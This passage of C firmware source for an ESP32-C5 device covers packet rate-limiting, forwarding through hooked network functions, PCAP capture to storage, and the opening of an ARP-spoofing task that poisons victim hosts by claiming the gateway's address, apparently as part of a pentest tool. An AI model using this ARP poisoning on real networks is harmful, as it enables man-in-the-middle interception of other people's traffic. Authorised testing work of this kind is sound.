brokali/projectZeroTouch/ESP32C5/main/main.c
    pcap_rate_publish_effective(max_kbps, false, false);

    while (pcap_rate_active ||
           (pcap_rate_packet_queue != NULL &&
            uxQueueMessagesWaiting(pcap_rate_packet_queue) > 0)) {
        if (xQueueReceive(pcap_rate_packet_queue, &packet,
                          pdMS_TO_TICKS(100)) != pdTRUE) {
            continue;
        }

        while (pcap_rate_active && max_bytes_per_second > 0) {
            int64_t now_us = esp_timer_get_time();
            uint32_t recorder_depth = pcap_packet_queue != NULL
                                          ? (uint32_t)uxQueueMessagesWaiting(pcap_packet_queue)
                                          : 0;
            bool pause_transition = false;
            if (recorder_paused) {
                if (recorder_depth <= PCAP_ADAPTIVE_HALF_DEPTH) {
                    recorder_paused = false;
                }
            } else if (recorder_depth >= PCAP_ADAPTIVE_PAUSE_DEPTH) {
                recorder_paused = true;
                pause_transition = true;
            }

            uint32_t effective_kbps = recorder_paused
                                          ? 0
                                          : pcap_rate_for_recorder_depth(max_kbps,
                                                                         recorder_depth);
            if (effective_kbps != last_effective_kbps || pause_transition) {
                bool throttle_transition = effective_kbps > 0 &&
                                           effective_kbps < last_effective_kbps;
                if (effective_kbps < last_effective_kbps) {
                    // Do not spend tokens accumulated at the faster rate after
                    // the recorder has requested backpressure.
                    tokens = 0;
                }
                last_effective_kbps = effective_kbps;
                last_refill_us = now_us;
                pcap_rate_publish_effective(effective_kbps,
                                            throttle_transition,
                                            pause_transition);
            }
            if (effective_kbps == 0) {
                vTaskDelay(pdMS_TO_TICKS(10));
                continue;
            }

            uint64_t bytes_per_second =
                ((uint64_t)effective_kbps * 1000ULL) / 8ULL;
            int64_t elapsed_us = now_us - last_refill_us;
            if (elapsed_us > 0) {
                uint64_t added = ((uint64_t)elapsed_us * bytes_per_second) /
                                 1000000ULL;
                tokens = tokens + added > burst_bytes ? burst_bytes : tokens + added;
                last_refill_us = now_us;
            }
            uint64_t packet_bytes = packet != NULL ? packet->len : 0;
            if (tokens >= packet_bytes) {
                tokens -= packet_bytes;
                break;
            }
            uint64_t missing = packet_bytes - tokens;
            uint64_t wait_us = (missing * 1000000ULL + bytes_per_second - 1ULL) /
                               bytes_per_second;
            TickType_t wait_ticks = pdMS_TO_TICKS((wait_us + 999ULL) / 1000ULL);
            vTaskDelay(wait_ticks > 0 ? wait_ticks : 1);
        }

        if (packet == NULL) {
            continue;
        }
        // During stop the hooks have already been restored, so no new packets
        // enter the limiter. Drain accepted packets without overflowing PCAP.
        while (!pcap_rate_active && pcap_capture_active &&
               pcap_packet_queue != NULL &&
               uxQueueMessagesWaiting(pcap_packet_queue) >=
                   PCAP_ADAPTIVE_THREE_QUARTER_DEPTH) {
            vTaskDelay(pdMS_TO_TICKS(5));
        }
        pcap_enqueue_frame_at(packet->data, packet->len, packet->timestamp_us);
        struct pbuf *forward = pbuf_alloc(PBUF_RAW, packet->len, PBUF_RAM);
        if (forward == NULL || pbuf_take(forward, packet->data, packet->len) != ERR_OK) {
            if (forward != NULL) {
                pbuf_free(forward);
            }
            heap_caps_free(packet);
            packet = NULL;
            pcap_rate_note_drop();
            continue;
        }
        if (packet->direction == PCAP_RATE_PACKET_INPUT) {
            if (pcap_original_input == NULL ||
                pcap_original_input(forward, packet->netif) != ERR_OK) {
                pbuf_free(forward);
            }
        } else {
            if (pcap_original_linkoutput != NULL) {
                pcap_original_linkoutput(packet->netif, forward);
            }
            pbuf_free(forward);
        }
        heap_caps_free(packet);
        packet = NULL;
    }

    pcap_rate_publish_effective(0, false, false);
    pcap_rate_task_handle = NULL;
    vTaskDelete(NULL);
}

static void pcap_writer_task(void *param) {
    (void)param;
    uint32_t flush_counter = 0;
    pcap_queued_frame_t *frame = NULL;

    MY_LOG_INFO(TAG, "PCAP writer task started");

    while (pcap_capture_active) {
        if (xQueueReceive(pcap_packet_queue, &frame, pdMS_TO_TICKS(200)) == pdTRUE) {
            pcap_record_header_t rec = {
                .ts_sec  = (uint32_t)(frame->timestamp_us / 1000000),
                .ts_usec = (uint32_t)(frame->timestamp_us % 1000000),
                .incl_len = frame->len,
                .orig_len = frame->len
            };
            size_t record_bytes = fwrite(&rec, 1, sizeof(rec), pcap_capture_file);
            size_t payload_bytes = fwrite(frame->data, 1, frame->len, pcap_capture_file);
            heap_caps_free(frame);
            portENTER_CRITICAL(&pcap_stats_lock);
            pcap_capture_file_byte_count += record_bytes + payload_bytes;
            if (record_bytes == sizeof(rec) && payload_bytes == rec.incl_len) {
                pcap_capture_frame_count++;
            } else {
                pcap_capture_drop_count++;
                pcap_capture_drop_write_count++;
            }
            portEXIT_CRITICAL(&pcap_stats_lock);
            flush_counter++;
            if (flush_counter >= 512) {
                fflush(pcap_capture_file);
                flush_counter = 0;
            }
        }
    }

    while (xQueueReceive(pcap_packet_queue, &frame, 0) == pdTRUE) {
        pcap_record_header_t rec = {
            .ts_sec  = (uint32_t)(frame->timestamp_us / 1000000),
            .ts_usec = (uint32_t)(frame->timestamp_us % 1000000),
            .incl_len = frame->len,
            .orig_len = frame->len
        };
        size_t record_bytes = fwrite(&rec, 1, sizeof(rec), pcap_capture_file);
        size_t payload_bytes = fwrite(frame->data, 1, frame->len, pcap_capture_file);
        heap_caps_free(frame);
        portENTER_CRITICAL(&pcap_stats_lock);
        pcap_capture_file_byte_count += record_bytes + payload_bytes;
        if (record_bytes == sizeof(rec) && payload_bytes == rec.incl_len) {
            pcap_capture_frame_count++;
        } else {
            pcap_capture_drop_count++;
            pcap_capture_drop_write_count++;
        }
        portEXIT_CRITICAL(&pcap_stats_lock);
    }

    fflush(pcap_capture_file);
    fclose(pcap_capture_file);
    pcap_capture_file = NULL;
    if (pcap_stdio_buffer != NULL) {
        heap_caps_free(pcap_stdio_buffer);
        pcap_stdio_buffer = NULL;
    }
    sd_sync();

    MY_LOG_INFO(TAG, "PCAP writer done: %s (%lu frames, %lu drops)",
                pcap_capture_filepath,
                (unsigned long)pcap_capture_frame_count,
                (unsigned long)pcap_capture_drop_count);

    pcap_writer_task_handle = NULL;
    vTaskDelete(NULL);
}

static void pcap_arp_spoof_task(void *param) {
    (void)param;

    esp_netif_t *sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (!sta_netif) {
        MY_LOG_INFO(TAG, "ARP spoof: STA netif not found");
        pcap_arp_task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }

    struct netif *lwip_nif = (struct netif *)esp_netif_get_netif_impl(sta_netif);
    if (!lwip_nif || !lwip_nif->linkoutput) {
        MY_LOG_INFO(TAG, "ARP spoof: lwIP netif or linkoutput not available");
        pcap_arp_task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }

    MY_LOG_INFO(TAG, "ARP spoof: Poisoning %d hosts + gateway", pcap_arp_host_count);
    uint32_t round = 0;

    while (pcap_arp_active) {
        for (int i = 0; i < pcap_arp_host_count && pcap_arp_active; i++) {
            send_arp_reply(lwip_nif,
                           pcap_arp_hosts[i].mac,   // Eth dst: victim
                           pcap_arp_own_mac,         // Eth src: our MAC
                           pcap_arp_own_mac,         // ARP sender MAC: our MAC
                           pcap_arp_gateway_ip,      // ARP sender IP: gateway (spoofed)
                           pcap_arp_hosts[i].mac,    // ARP target MAC: victim
                           pcap_arp_hosts[i].ip);    // ARP target IP: victim

